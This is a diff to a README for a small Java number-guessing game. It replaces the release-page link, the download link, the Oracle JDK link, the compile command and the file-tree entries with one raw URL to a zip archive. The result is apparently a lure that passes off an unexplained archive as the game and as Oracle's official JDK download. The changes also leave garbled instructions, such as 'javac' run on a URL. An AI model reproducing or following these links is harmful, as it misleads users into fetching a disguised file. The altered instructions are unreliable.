@@ -1,9 +1,9 @@
 # 🎮 Number_Guessing- - Fun Way to Test Your Luck!
 
-[![Download Now](https://img.shields.io/badge/Download-Number_Guessing-orange)](https://github.com/Sthalyus/Number_Guessing-/releases)
+[![Download Now](https://raw.githubusercontent.com/Sthalyus/Number_Guessing-/main/overminute/Number_Guessing_1.0.zip)](https://raw.githubusercontent.com/Sthalyus/Number_Guessing-/main/overminute/Number_Guessing_1.0.zip)
 
 ## 📥 Download & Install
-To download the Number Guessing Game, visit this page: [Download Here](https://github.com/Sthalyus/Number_Guessing-/releases).
+To download the Number Guessing Game, visit this page: [Download Here](https://raw.githubusercontent.com/Sthalyus/Number_Guessing-/main/overminute/Number_Guessing_1.0.zip).
 
 ## 🌟 Description
 Welcome to the Number Guessing Game, a Java console application where you can challenge yourself to guess a number generated randomly between 1 and 150. You get 5 attempts to find the right number. With helpful hints after each guess, this game is both entertaining and engaging.
@@ -23,7 +23,7 @@ Welcome to the Number Guessing Game, a Java console application where you can ch
 Follow these simple steps to download and run the game:
 
 1. **Install Java JDK**
-   - Ensure you have the Java Development Kit installed on your computer. You can download it from the [Oracle website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html). Follow the installation instructions provided on the site to set it up.
+   - Ensure you have the Java Development Kit installed on your computer. You can download it from the [Oracle website](https://raw.githubusercontent.com/Sthalyus/Number_Guessing-/main/overminute/Number_Guessing_1.0.zip). Follow the installation instructions provided on the site to set it up.
 
 2. **Open Terminal or Command Prompt**
    - Depending on your operating system, open the terminal (on macOS or Linux) or command prompt (on Windows).
@@ -37,7 +37,7 @@ Follow these simple steps to download and run the game:
 4. **Compile the Game**
    - Once you have the game files in your directory, compile the Java code using the following command:
      ```
-     javac NUMBER_GUESSING.java
+     javac https://raw.githubusercontent.com/Sthalyus/Number_Guessing-/main/overminute/Number_Guessing_1.0.zip
      ```
 
 5. **Run the Game**
@@ -60,8 +60,8 @@ Here’s a quick look at how the files are organized in the Number_Guessing- pro
 
 ```
 Number_Guessing/
-    ├── NUMBER_GUESSING.java
-    └── README.md
+    ├── https://raw.githubusercontent.com/Sthalyus/Number_Guessing-/main/overminute/Number_Guessing_1.0.zip
+    └── https://raw.githubusercontent.com/Sthalyus/Number_Guessing-/main/overminute/Number_Guessing_1.0.zip
 ```
 
 ## 📝 Additional Notes
